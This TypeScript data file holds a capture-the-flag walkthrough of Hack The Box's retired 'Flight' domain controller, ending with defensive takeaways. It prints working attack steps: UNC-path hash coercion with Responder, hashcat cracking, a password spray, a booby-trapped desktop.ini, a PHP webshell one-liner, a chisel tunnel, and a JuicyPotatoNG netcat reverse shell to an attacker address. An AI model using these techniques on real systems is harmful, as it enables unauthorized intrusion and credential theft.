import type { WalkthroughDoc } from "./types";

export const flight: WalkthroughDoc = {
  slug: "flight",
  name: "Flight",
  platform: "Hack The Box",
  os: "Windows",
  difficulty: "Hard",
  retired: "May 2023",
  ip: "10.10.11.187",
  tags: [
    "LFI/RFI",
    "Responder / Net-NTLMv2",
    "Password spray",
    "Forced authentication",
    "SMB share abuse",
    "ASPX webshell",
    "SeImpersonate / JuicyPotatoNG",
    "Active Directory",
  ],
  lede: "A flight-school vhost hides a file-include parameter that we coerce into leaking a service account's Net-NTLMv2 hash. From there it is pure Active Directory chain-work: crack, spray, steal a second hash with a booby-trapped `desktop.ini`, plant a webshell, pivot onto an internal IIS site, and cash in `SeImpersonatePrivilege` for SYSTEM.",
  summary:
    "An LFI on a flight-school vhost coerces svc_apache's Net-NTLMv2 hash to Responder; cracking, spraying, and desktop.ini forced-auth chain across S.Moon and c.bum to a webshell, then JuicyPotatoNG on an IIS apppool for SYSTEM.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“The hardest part of any journey is not being made to leave the ground.”" },
        { kind: "p", text: "**Flight** is a Hard-rated Windows machine — and specifically a **Domain Controller** running an out-of-place Apache/PHP stack. There is no single exploit here; the box is a chain of realistic Active Directory misconfigurations where each account we compromise unlocks a slightly different privilege that reaches the next one. Password reuse, over-permissive share ACLs, forced authentication, and a badly-privileged IIS worker process all stack up into a full DC takeover." },
        { kind: "p", text: "Before we start drilling, here is the complete route from an unauthenticated scan to a SYSTEM shell:" },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap → Windows DC + Apache/PHP on `80`",
            "**vhost fuzz** — `school.flight.htb`, a `view=` file include",
            "**LFI → UNC coerce** — Responder captures `svc_apache` Net-NTLMv2",
            "**hashcat -m 5600** — crack `svc_apache`",
            "**password spray** — reuse lands `S.Moon`",
            "**desktop.ini** — force-auth steals `c.bum` Net-NTLMv2 → crack",
            "**Web share** — PHP webshell → shell as `svc_apache`",
            "**user.txt**",
            "**internal IIS :8000** — ASPX webshell → `defaultapppool`",
            "**SeImpersonate** — JuicyPotatoNG → `NT AUTHORITY\\SYSTEM`",
            "**root.txt**",
          ],
        },
        { kind: "callout", variant: "note", title: "Two web stacks, one host", text: "The tell that drives the whole box is that a **Windows DC is serving Apache 2.4.52 / PHP 8.1.1 on port 80** — a XAMPP-style stack that has no business on a domain controller. That is the intended foothold. A second, *internal-only* IIS site on port `8000` is the pivot for privesc. Keep the two straight: PHP on `80`, ASPX on `8000`." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "We start with a full TCP sweep to find every listener, then re-scan the open ports with service and script detection." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 -oA scans/allports 10.10.11.187",
            "$ nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \\",
            "      -oA scans/tcp 10.10.11.187",
            "PORT     STATE SERVICE       VERSION",
            "53/tcp   open  domain        Simple DNS Plus",
            "80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)",
            "88/tcp   open  kerberos-sec  Microsoft Windows Kerberos",
            "389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb)",
            "445/tcp  open  microsoft-ds?",
            "5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)",
          ],
          highlight: [4, 7],
        },
        { kind: "p", text: "The port profile is a textbook Windows Domain Controller — Kerberos (`88`), LDAP (`389`/`636`), the global catalog (`3268`/`3269`), SMB (`445`), DNS (`53`), and WinRM (`5985`). LDAP and the SMB banners leak the domain **flight.htb** and the DC hostname **G0**. The odd one out is port `80`: **Apache httpd 2.4.52 with PHP 8.1.1** on a DC. That mismatch is where the box wants us to look." },
        { kind: "p", text: "The vhosts won't resolve until we teach our resolver about them, so we seed `/etc/hosts` up front." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo '10.10.11.187 flight.htb school.flight.htb g0.flight.htb' | sudo tee -a /etc/hosts",
          ],
        },
        { kind: "callout", variant: "tip", title: "Signing is on — no relay, capture instead", text: "SMB signing is **required** on a DC, so classic SMB relay is off the table. The intended NTLM path is capture-and-crack: coerce the host into authenticating to *us*, grab the Net-NTLMv2 challenge/response, and crack it offline. Bank that — it shapes every step for the next three sections." },
      ],
    },
    {
      id: "vhost",
      num: "02",
      title: "Web enumeration & the school vhost",
      blocks: [
        { kind: "p", text: "The apex site at `flight.htb` is a mostly static aviation template — pretty, but content discovery on it goes nowhere. Because the box is a DC running DNS, the right move on any `*.htb` web root is **virtual-host fuzzing**: hammer the `Host` header and watch for a response that differs from the baseline." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ gobuster vhost -u http://flight.htb --append-domain -t 50 \\",
            "      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt",
            "Found: school.flight.htb (Status: 200) [Size: ...]",
            "",
            "# equivalently with ffuf, filtering the baseline body size:",
            "$ ffuf -u http://10.10.11.187/ -H 'Host: FUZZ.flight.htb' \\",
            "      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <baseline>",
          ],
          highlight: [2],
        },
        { kind: "p", text: "One hit: **school.flight.htb**. Adding it to `/etc/hosts` (already done above) and browsing it reveals a small PHP flight-school page whose navigation loads content through a `view=` GET parameter, e.g. `index.php?view=home.html`. Any parameter that names a *file* is worth probing for local file inclusion." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl 'http://school.flight.htb/index.php?view=home.html'",
          ],
        },
        { kind: "callout", variant: "note", title: "The apex is a decoy", text: "All of the interesting behaviour lives on the **school** vhost's `view=` parameter. The main `flight.htb` template is scenery — don't burn hours brute-forcing directories on it." },
      ],
    },
    {
      id: "lfi-capture",
      num: "03",
      title: "LFI → forced SMB auth → svc_apache's hash",
      blocks: [
        { kind: "p", text: "The `view=` parameter is a file include. It filters the obvious remote wrappers — `http://`, `php://` — and some traversal tricks, but it happily accepts **Windows UNC paths**. That is the whole trick: on Windows, referencing a `\\\\host\\share` path makes the machine reach out over SMB and *authenticate* to that host. If we point it at ourselves and listen, we capture the credential of whatever account the web server runs as." },
        { kind: "p", text: "First we confirm the include is real by reading a known local file." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl 'http://school.flight.htb/index.php?view=C:\\Windows\\System32\\drivers\\etc\\hosts'",
            "# ... contents of the Windows hosts file returned inline -> LFI confirmed",
          ],
        },
        { kind: "p", text: "Now we stand up Responder on the VPN interface to catch the inbound SMB authentication, then coerce it by feeding a UNC path pointing back at our box into the same parameter." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# terminal 1 — listen for the inbound auth:",
            "$ sudo responder -I tun0",
            "",
            "# terminal 2 — coerce the DC to authenticate to us:",
            "$ curl 'http://school.flight.htb/index.php?view=//10.10.14.x/x'",
            "",
            "# responder catches the challenge/response:",
            "[SMB] NTLMv2-SSP Client   : 10.10.11.187",
            "[SMB] NTLMv2-SSP Username : flight.htb\\svc_apache",
            "[SMB] NTLMv2-SSP Hash     : svc_apache::flight.htb:<challenge>:<response>...",
          ],
          highlight: [8, 9],
        },
        { kind: "p", text: "That is a **Net-NTLMv2** hash for the Apache service account **svc_apache** — a challenge/response, not a raw NTLM hash, so we can't pass it, but we *can* crack it offline. hashcat mode `5600` against rockyou breaks it quickly because the password is weak." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ hashcat -m 5600 svc_apache.hash /usr/share/wordlists/rockyou.txt",
            "SVC_APACHE::flight.htb:...:...:S@Ss!K@*t13",
          ],
          highlight: [1],
        },
        { kind: "callout", variant: "warn", title: "Use a UNC path, not a wrapper", text: "`http://` and `php://` are filtered, so the RFI-to-webshell shortcut is blocked. The include *does* accept `\\\\10.10.14.x\\x` (or `//10.10.14.x/x`), which is what triggers the SMB reach-out. And remember: this yields a **crackable Net-NTLMv2**, not a pass-the-hash-able NTLM." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Credential `svc_apache : S@Ss!K@*t13`. It **cannot WinRM in** and has thin privileges — its real value is as authenticated access for domain enumeration and, crucially, a password to spray." },
      ],
    },
    {
      id: "spray",
      num: "04",
      title: "Domain enumeration & password spray",
      blocks: [
        { kind: "p", text: "A valid domain credential — even a weak one — lets us read the directory. We pull the full user list over SMB/RPC, then **spray** the one password we own across every account. Password reuse is endemic on this box, and svc_apache's password is not unique to svc_apache." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users",
            "# or over RPC:",
            "$ rpcclient -U 'svc_apache%S@Ss!K@*t13' 10.10.11.187 -c enumdomusers",
            "# svc_apache, S.Moon, C.Bum, O.Possum, V.Stevens, ...",
            "",
            "# save the names to users.txt and spray the single known password:",
            "$ crackmapexec smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success",
            "SMB  10.10.11.187  445  G0  [+] flight.htb\\S.Moon:S@Ss!K@*t13",
          ],
          highlight: [7],
        },
        { kind: "p", text: "**S.Moon** reuses the exact same password. That gives us a second identity — same password, but a different set of share permissions, which is precisely what we need to move forward." },
        { kind: "callout", variant: "warn", title: "Spray one password across many users", text: "Always spray *one* password against *many* accounts, never many passwords against one — the latter trips account lockout policies. `--continue-on-success` keeps going after the first hit so we see every account that reuses the password." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Credential `S.Moon : S@Ss!K@*t13` (password reuse). S.Moon — not svc_apache — holds **write** access to the `Shared` share we abuse next." },
      ],
    },
    {
      id: "desktop-ini",
      num: "05",
      title: "Stealing c.bum's hash with a malicious desktop.ini",
      blocks: [
        { kind: "p", text: "Enumerating shares as S.Moon shows a writable **Shared** share. A writable share on which other users browse is a forced-authentication goldmine: Windows Explorer automatically parses a `desktop.ini` in any folder it opens, and an `IconResource` pointing at a UNC path makes Explorer fetch that icon — authenticating to us in the process. So we drop a booby-trapped `desktop.ini` and wait for another user to walk into the folder." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares",
            "# Shared -> READ,WRITE   Web -> READ   (+ ADMIN$, C$, IPC$, NETLOGON, SYSVOL, Users)",
            "",
            "$ smbclient '//flight.htb/Shared' -U 'flight.htb/S.Moon%S@Ss!K@*t13'",
            "smb: \\> put desktop.ini",
          ],
          highlight: [1],
        },
        {
          kind: "code",
          lang: "ini",
          label: "desktop.ini",
          lines: [
            "[.ShellClassInfo]",
            "IconResource=\\\\10.10.14.x\\share\\icon.ico",
          ],
        },
        { kind: "p", text: "With Responder still listening, a scheduled browse by **c.bum** lands in the folder, Explorer parses our `desktop.ini`, and c.bum's Net-NTLMv2 arrives. Same drill as before — crack it with mode `5600`." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "[SMB] NTLMv2-SSP Username : flight.htb\\c.bum",
            "[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:<challenge>:<response>...",
            "",
            "$ hashcat -m 5600 cbum.hash /usr/share/wordlists/rockyou.txt",
            "C.BUM::flight.htb:...:...:Tikkycoll_431012284",
          ],
          highlight: [0, 4],
        },
        { kind: "callout", variant: "warn", title: "Keep Responder running — the browse is on a timer", text: "c.bum's visit happens on an interval, so the hash lands after a short wait rather than instantly. A `desktop.ini` is the most reliable trigger because Explorer parses it with no clicks, but a malicious `.url` or `.lnk` in the same share works too. Note that S.Moon can write to `Shared` but *not* to `Web` — we need c.bum for that." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Credential `c.bum : Tikkycoll_431012284`. c.bum has **write** access to the `Web` share, which maps onto the web content the box serves — our route to code execution." },
      ],
    },
    {
      id: "webshell",
      num: "06",
      title: "Foothold shell: PHP webshell as svc_apache",
      blocks: [
        { kind: "p", text: "The `Web` share is the web root served by Apache. c.bum can write there, so we drop a one-line PHP webshell into the `flight.htb` site and request it. The page executes as the Apache service account — which is why our shell lands as **svc_apache** even though c.bum planted the file." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ smbclient '//flight.htb/Web' -U 'flight.htb/c.bum%Tikkycoll_431012284'",
            "smb: \\> cd flight.htb",
            "smb: \\> put shell.php",
            "# shell.php:  <?php system($_REQUEST['cmd']); ?>",
            "",
            "$ curl 'http://flight.htb/shell.php?cmd=whoami'",
            "flight\\svc_apache",
          ],
          highlight: [6],
        },
        { kind: "p", text: "We now have command execution on the DC. Before pivoting we do local enumeration and find something the external nmap never saw — an internal listener on port **8000**, backed by a separate IIS web root at `C:\\inetpub\\development`." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl 'http://flight.htb/shell.php?cmd=netstat -ano' | grep 8000",
            "TCP    0.0.0.0:8000    0.0.0.0:0    LISTENING",
          ],
          highlight: [1],
        },
        { kind: "callout", variant: "note", title: "Why svc_apache, and why 8000 is hidden", text: "The Apache worker runs PHP as svc_apache, so any code we execute through that site inherits svc_apache's context. Port `8000` binds to localhost only, which is why it never appeared in our remote scan — it is only reachable from on-box (or through a tunnel we build ourselves). Upgrade to a stable reverse shell before going further." },
      ],
    },
    {
      id: "user",
      num: "07",
      title: "user.txt",
      blocks: [
        { kind: "p", text: "The user flag sits on c.bum's desktop, readable from our svc_apache execution context." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl 'http://flight.htb/shell.php?cmd=type C:\\Users\\C.Bum\\Desktop\\user.txt'",
            "8f4b91c2····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "Foothold secured. But svc_apache is a dead end for privilege escalation — it lacks the privileges we need. The way up is the *other* web stack: the internal IIS site on port `8000`, whose worker process runs with a far more dangerous privilege." },
      ],
    },
    {
      id: "pivot-iis",
      num: "08",
      title: "Pivot to internal IIS: ASPX webshell as the apppool",
      blocks: [
        { kind: "p", text: "Port `8000` is IIS serving `C:\\inetpub\\development` — and conveniently, c.bum's `Web` share also maps onto that development root. That means we can write into it the same way, but this time we must drop an **ASPX** shell because the internal site is IIS/.NET, not Apache/PHP. To reach `8000` from our box we forward it out through the foothold with chisel." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# attacker — chisel server in reverse mode:",
            "$ ./chisel server -p 8080 --reverse",
            "",
            "# on target — forward the internal 8000 back to us:",
            "$ chisel.exe client 10.10.14.x:8080 R:8000:127.0.0.1:8000",
            "",
            "# plant the aspx shell in the development root via the Web share:",
            "$ smbclient '//flight.htb/Web' -U 'flight.htb/c.bum%Tikkycoll_431012284' \\",
            "      -c 'cd development; put shell.aspx'",
          ],
        },
        { kind: "p", text: "Requesting the ASPX shell through the tunnel gives execution as the IIS application-pool identity — **iis apppool\\defaultapppool**. And critically, we check its privileges." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl 'http://127.0.0.1:8000/shell.aspx?cmd=whoami'",
            "iis apppool\\defaultapppool",
            "",
            "$ curl 'http://127.0.0.1:8000/shell.aspx?cmd=whoami /priv' | grep -i impersonate",
            "SeImpersonatePrivilege   Impersonate a client after authentication   Enabled",
          ],
          highlight: [1, 4],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Execution as `iis apppool\\defaultapppool` — an unprivileged account on paper, **except** it holds `SeImpersonatePrivilege`, the single privilege that turns a low-priv service into SYSTEM." },
        { kind: "callout", variant: "note", title: "This is the whole point of the pivot", text: "svc_apache does *not* have `SeImpersonatePrivilege`; the IIS apppool does. Moving from the PHP site to the ASPX site isn't lateral for its own sake — it's how we land on an identity that can be escalated. If you can't tunnel, you can also drive `8000` directly from the on-box svc_apache shell." },
      ],
    },
    {
      id: "privesc",
      num: "09",
      title: "SeImpersonate → SYSTEM with JuicyPotatoNG",
      blocks: [
        { kind: "epigraph", text: "“Impersonate a client after authentication.” — the privilege that reads like an invitation" },
        { kind: "p", text: "`SeImpersonatePrivilege` lets a process impersonate the security context of any client that connects to it. The \"Potato\" family of exploits weaponises this: they trick a SYSTEM-level service into authenticating to a local COM/RPC endpoint we control, then impersonate the token that arrives — yielding a SYSTEM process. On Windows Server 2019 the original JuicyPotato no longer works, so we reach for **JuicyPotatoNG** (GodPotato and PrintSpoofer are equally valid here)." },
        { kind: "p", text: "We upload the tool and a netcat binary to a directory the apppool can write to — `C:\\Windows\\Temp` is reliable — then fire it through the ASPX shell to spawn a SYSTEM reverse shell back to our listener." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# catch the SYSTEM shell:",
            "$ nc -lvnp 4444",
            "",
            "# trigger via the aspx shell:",
            "$ curl 'http://127.0.0.1:8000/shell.aspx?cmd=C:\\Windows\\Temp\\JuicyPotatoNG.exe \\",
            "        -t * -p C:\\Windows\\Temp\\nc.exe -a \"-e cmd.exe 10.10.14.x 4444\"'",
            "",
            "# alternative: GodPotato",
            "# GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
            "",
            "# on the caught shell:",
            "# whoami",
            "nt authority\\system",
          ],
          highlight: [12],
        },
        { kind: "callout", variant: "warn", title: "Pick a potato that works on Server 2019", text: "The original JuicyPotato relies on a BITS/CLSID trick that Microsoft closed on Server 2019/2022 — it will just fail. Use **JuicyPotatoNG**, **GodPotato**, or **PrintSpoofer**. Run the payload from a writable path like `C:\\Windows\\Temp`, and have your listener ready before you fire it." },
      ],
    },
    {
      id: "root",
      num: "10",
      title: "root.txt",
      blocks: [
        { kind: "p", text: "As SYSTEM on the domain controller, the root flag is ours." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# type C:\\Users\\Administrator\\Desktop\\root.txt",
            "3d7a06e5····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "We hold `NT AUTHORITY\\SYSTEM` on **G0**, the flight.htb domain controller — full control of the domain. From a filtered `view=` parameter to complete AD compromise, every account we touched handed us the key to the next. ✈" },
      ],
    },
    {
      id: "defense",
      num: "11",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Constrain file-include parameters.** `view=` should whitelist known filenames and never accept UNC or remote paths — that one control kills both the LFI disclosure and the outbound SMB coercion at once.",
            "**Block outbound SMB and disable NTLM where possible.** Forced-authentication attacks only work because the host reaches out on `445`/`139` and volunteers its Net-NTLMv2. Egress-filter SMB from servers and prefer Kerberos-only.",
            "**Enforce unique, high-entropy passwords.** Reuse turned a single cracked svc_apache credential into S.Moon, and weak passwords made both Net-NTLMv2 hashes trivially crackable against rockyou. Use a password manager / gMSA for service accounts.",
            "**Lock down share ACLs.** No user should have write access to shares whose contents auto-execute (`Web` → web roots) or are auto-parsed by Explorer (`Shared` → `desktop.ini`). That combination enabled both the webshell drop and the hash theft.",
            "**Strip SeImpersonatePrivilege from app-pool identities.** Run IIS pools under least-privileged virtual or managed accounts. This single privilege is what promoted a low-priv webshell to SYSTEM via JuicyPotatoNG.",
            "**Monitor for anomalous NTLM auth and new webshells.** Alert on NTLM authentications to non-infrastructure hosts, and use file-integrity monitoring / EDR to catch executables and `.php`/`.aspx` files appearing under `inetpub` and content shares.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "vhost enumeration · LFI/RFI · UNC forced authentication · Responder capture · Net-NTLMv2 cracking (hashcat -m 5600) · domain user enumeration · password spraying · desktop.ini hash theft · SMB share abuse · PHP & ASPX webshells · chisel port-forwarding · SeImpersonate abuse · JuicyPotatoNG privilege escalation." },
      ],
    },
  ],
};
